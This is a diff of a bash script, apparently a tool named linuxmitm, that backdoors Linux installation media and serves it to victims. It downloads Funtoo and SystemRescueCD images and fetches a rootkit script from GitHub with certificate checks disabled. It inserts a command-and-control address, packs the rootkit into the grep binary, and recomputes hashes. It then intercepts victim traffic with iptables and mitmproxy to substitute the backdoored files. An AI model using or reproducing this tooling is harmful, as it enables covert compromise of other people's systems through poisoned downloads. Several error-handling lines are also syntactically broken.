@@ -12,7 +12,8 @@ LANG="en_US.UTF-8"
 EXEC_PORTAGE="emerge -u pip dialog cdrtools squashfs-tools lighttpd"
 EXEC_APT="apt-get install dialog lighttpd python-pip squashfs-tools genisoimage"
 EXEC_YUM="yum install dialog lighttpd python-pip squashfs-tools mkisofs cdrtools"
-
+DEPENDENCIES=("bash" "cp" "mv" "rm" "ls" "mkdir" "tar" "awk" "grep" "sed" "md5sum" "sha256sum" "ip" "iptables" "which" "whoami" 
+             "curl" "mount" "chmod" "dialog" "pip" "lighttpd" "unsquashfs" "mksquashfs" "mitmproxy")
 
 
 function usage {
@@ -23,6 +24,17 @@ function usage {
 
 function popup {
     dialog --msgbox "$1"  7 40
+}
+
+#meh...version checks would be nice
+function dependency_check {
+  for dep in "${DEPENDENCIES[@]}";
+   do
+     if ! command -v "$dep" > /dev/null;then
+         echo "Missing dependency $dep , exiting..."
+         exit
+     fi
+   done
 }
 #include openssl,netcat,wget here if they aren't installed
 function install_packages {
@@ -41,14 +53,25 @@ function install_packages {
       else
           echo "You must have one of emerge, apt-get, or yum to install dependencies"
           echo "We're continuing anyways, good luck!"
+          
       fi
-  
+      
+  install_pypi
 }
 function fetch {
    if [ $# -lt 2 ]; then
    wget "$1"
+     if [ $? -ge 1 ];then
+         echo "Error fetching $1" 
+         exit
+     fi
+
    else 
    wget "$1" -O "$2"
+     if [ $? -ge 1 ];then
+         echo "Error fetching $1 to $2" 
+         exit
+     fi
    fi
 }
 
@@ -64,6 +87,12 @@ function install_pypi {
 function setup_funtoo (){
 RESCUE_BASE="systemrescuecd-x86-4.7.1.iso"
 STAGE3_BASE="stage3-latest.tar.xz"
+ISO_ARGS="-o ../out/${RESCUE_BASE} -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V ${RESCUE_BASE} ."
+if [ $(which mkisofs) ]; then
+    ISO_EXEC="mkisofs"
+else
+    ISO_EXEC="genisoimage"
+fi
 
 if [ -e "out/"$RESCUE_BASE ] && [ -e "out/"$STAGE3_BASE ] && [ -e "out/"$STAGE3_BASE".hash.txt" ];then
   dialog --yesno "Existing installation media files found in the output directory. Continue funtoo setup?" 9 40
@@ -73,15 +102,20 @@ if [ -e "out/"$RESCUE_BASE ] && [ -e "out/"$STAGE3_BASE ] && [ -e "out/"$STAGE3_
 fi
 
 mkdir backdoor-stage3 backdoor-iso-ro backdoor-iso-rw out
+if [ $? -ge 1 ];then
+     echo "Error creating work directories" 
+     exit
+fi
+
 if [ -e $STAGE3_BASE ] && [ -e $RESCUE_BASE ]; then
   dialog --yesno "Existing original installation media found, skip download?" 7 40
      if [ $? -ge 1 ]; then
 # Get all the packages
-fetch http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/$STAGE3_BASE #replace with current stage3 url
+fetch http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/$STAGE3_BASE 
 fetch http://build.funtoo.org/distfiles/sysresccd/$RESCUE_BASE
      fi
  else
-fetch http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/$STAGE3_BASE #replace with current stage3 url
+fetch http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/$STAGE3_BASE 
 fetch http://build.funtoo.org/distfiles/sysresccd/$RESCUE_BASE
 fi
 
@@ -94,56 +128,70 @@ else
    echo "Please stand by,extracting files from installation media..."
 fi
 
-cp -a ./backdoor-iso-ro/* ./backdoor-iso-rw/
-tar -C backdoor-stage3 -xf ./stage3-latest.tar.xz
+cp -a ./backdoor-iso-ro/* ./backdoor-iso-rw/ &&
+tar -C backdoor-stage3 -xf ./stage3-latest.tar.xz &&
 unsquashfs -d ./backdoor-squash/ ./backdoor-iso-ro/sysrcd.dat
+
+if [ $? -ge 1 ];then
+     echo "Error extracting stage3 and/or ISO" 
+     exit
+fi
+
+
 echo "fetching mitmproxy inline script and backdoor script."
 # Get the backdoor scripts
-curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/redirect.py > redirect.py
-curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/backdoor.sh > backdoor-stage3/etc/local.d/' '
+curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/redirect.py > redirect.py &&
+curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/pack.sh > ./pack.sh &&
+curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/rtkt.sh > ./rtkt.sh &&
+chmod a+x ./pack.sh
+
+if [ $? -ge 1 ];then
+     echo "Error fetching scripts" 
+     exit
+fi
+
 echo "Applying Backdoor."
 # Update the scripts with the command and control
-sed -i "s/REPLACEME/$CNC/" backdoor-stage3/etc/local.d/' '
+sed -i "s/REPLACEME/$CNC/" ./rtkt.sh
 sed -i "s/REPLACEME/$INTERFACE_IP/" redirect.py
 
 # I guess I wasn't too creative here... a million ways to do this, I picked the simplest one I could think of.
-cp backdoor-stage3/etc/local.d/' ' ./backdoor-squash/etc/local.d/' '
+cp ./backdoor-squash/bin/grep ./ && cp ./backdoor-stage3/bin/grep3 ./
 
-echo "/etc/local.d/' '" >> ./backdoor-squash/etc/profile
-echo "/etc/local.d/' '" >> ./backdoor-squash/etc/zsh/zprofile
-echo '#local.d place holder' > ./backdoor-squash/etc/local.d/local.start
-echo '/etc/local.d/ ' > ./backdoor-squash/etc/local.d/local.start
-chmod a+x ./backdoor-squash/etc/local.d/local.start
-cp ./backdoor-squash/etc/local.d/local.start ./backdoor-stage3/etc/local.d/
+./pack.sh ./rtkt.sh ./grep && ./pack.sh ./rtkt.sh ./grep3
 
-chmod a+x ./backdoor-stage3/etc/local.d/' '
-chmod a+x ./backdoor-squash/etc/local.d/' '
+if ! [ -e ./grep.out ] || ! [ -e ./grep3.out ];then
+     echo "Error applying backdoor" 
+     exit
+fi
 
+cp -f ./grep.out ./backdoor-squash/bin/grep && cp -f ./grep3.out ./backdoor-stage3/bin/grep && 
+chmod a+x ./backdoor-squash/bin/grep && chmod a+x ./backdoor-stage3/bin/grep
+
+if [ $? -ge 1 ]; then
+     echo "Error copying back backdoored binary" 
+     exit
+fi
 
 echo "Re-packaging backdoored installation media, you should probably go get a coffee or something, this will take a while..."
 # Pack backdoored files
-cd backdoor-stage3
-tar -cJf ../out/$STAGE3_BASE *
-cd ../backdoor-squash
-mksquashfs * ../sysrcd-backdoored.dat
-cd ../backdoor-iso-rw
+cd backdoor-stage3 && tar -cJf ../out/$STAGE3_BASE * && cd ../backdoor-squash && 
+mksquashfs * ../sysrcd-backdoored.dat && cd ../backdoor-iso-rw
 
-rm sysrcd*
-mv ../sysrcd-backdoored.dat ./sysrcd.dat
-md5sum sysrcd.dat > sysrcd.md5
-
-ISO_ARGS="-o ../out/${RESCUE_BASE} -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V ${RESCUE_BASE} ."
-if [ $(which mkisofs) ]; then
-    ISO_EXEC="mkisofs"
-else
-    ISO_EXEC="genisoimage"
+if [ $? -ge 1 ]; then
+   "Error re-packing backdoored stage3"
+   exit
 fi
 
-$ISO_EXEC $ISO_ARGS
+rm sysrcd* && mv ../sysrcd-backdoored.dat ./sysrcd.dat && 
+md5sum sysrcd.dat > sysrcd.md5 && $ISO_EXEC $ISO_ARGS
 
-cd ../out 
-sha256sum $STAGE3_BASE >  $STAGE3_BASE".hash.txt" 
-cd ..
+if [ $? -ge 1 ]; then
+   "Error re-packing backdoored ISO"
+   exit
+fi
+
+cd ../out && sha256sum $STAGE3_BASE >  $STAGE3_BASE".hash.txt" && cd .. 
 umount backdoor-iso-ro
 
 }
@@ -227,8 +275,24 @@ if [ $# -lt 2 ]; then
     usage
 fi
 
+
 VICTIM_IP="$1"
 CNC="$2"
+
+if  [ $(whoami) !=  "root" ];then
+   echo "Not running as root,exiting..."
+   exit
+fi
+
+install_packages
+
+
+dependency_check
+
+if  [ $(uname -o) != "GNU/Linux"
+    popup "WARNING: only GNU/Linux is supported at this time, will continue execution,good luck."
+fi
+
 
 # Pick victim IP, find what interface it is on, setup
 # iptables rules accordingly for the interface
@@ -251,9 +315,7 @@ if [ $? -ge 1 ]; then
 fi
 
 
-install_packages
 
-install_pypi
 
 # Ideally you will set this up on your own system and just wget
 # the backdoored stage3 and iso.
@@ -282,7 +344,7 @@ dialog --checklist "What operating system distributions would you like to backdo
         13 "FreeBSD" off 2>"${tmpchecklist}" 
         
  if [ $? -ge 1 ]; then
-    echo "Bye!"
+    echo "Bye"
     
  fi
  
@@ -335,18 +397,23 @@ dialog --checklist "What operating system distributions would you like to backdo
    esac
 done
 
+    
 ls -l out
 
-# Start and fork twisted web server to host the backdoored files
+# Start and fork lighttpd web server to host the backdoored files
 #
 # You would normally run this somewhere on the internet with a
 # similar domain as the file server, either that or you can modify
 # dns response to point to this target machine to fool users
 # if you specify a CNC outside of the compromised box it will work fine.
-curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/lighttpd.conf > lighttpd.conf
-echo "Starting lighttpd web server started on port 81"
+curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/lighttpd.conf > lighttpd.conf &&
+echo "Starting lighttpd web server started on port 81" &&
 sed -i "s#PWD#${PWD}#" lighttpd.conf
-
+     if [ $? -ge 1 ];then
+         echo "Error fetching and configuring lighttpd" 
+         exit
+     fi
+     
 lighttpd -f lighttpd.conf&
 
 if [ $? -ne 0 ]; then
@@ -359,7 +426,12 @@ fi
 
 
 # Set it up
-iptables -t nat -A PREROUTING -i $INTERFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080
+iptables -t nat -A PREROUTING -i $INTERFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080 
+     if [ $? -ge 1 ];then
+         echo "Error applying iptables rule on $INTERFACE" 
+         exit
+     fi
+     
 mitmproxy --anticache -T -s ./redirect.py
 
 echo "Ready as can be, try downloading a target file and see if it works :)"
